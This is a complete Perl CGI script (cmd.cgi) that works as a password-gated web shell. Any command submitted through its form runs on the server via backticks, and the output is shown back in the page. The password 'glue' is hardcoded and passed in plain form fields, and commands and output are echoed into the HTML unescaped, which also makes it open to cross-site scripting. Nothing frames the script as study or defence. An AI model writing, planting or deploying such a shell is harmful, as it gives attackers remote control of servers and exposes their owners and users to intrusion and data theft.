#!/usr/bin/perl

my $password = "glue";

use CGI;

my $cgih = new CGI;
my $command = $cgih->param('command');
my $history = $cgih->param('history');
my $secret = $cgih->param('secret');

print "Content-type: text/html\n\n";


## limited security
if ($secret ne $password){
	print qq{
		<form name="form" action="cmd.cgi" method="post">
		Secret?<br>
		<input type="text" name="secret" size="40">
		<input type="submit" value="go">
		</form>
	};
	exit();
}

my $result = join('', `$command`);

my $history = "&gt; <b>$command</b>\n$result$history";

print qq{

<form name="form" action="cmd.cgi" method="post">
<input type="text" name="command" size="40">
<input type="submit" value="go">
<input type="hidden" name="secret" value="$secret">

<pre>
$history
</pre>
<textarea name="history" cols="40" rows="1">$history</textarea>
</form>

<script>
document.form.command.focus();
</script>

};
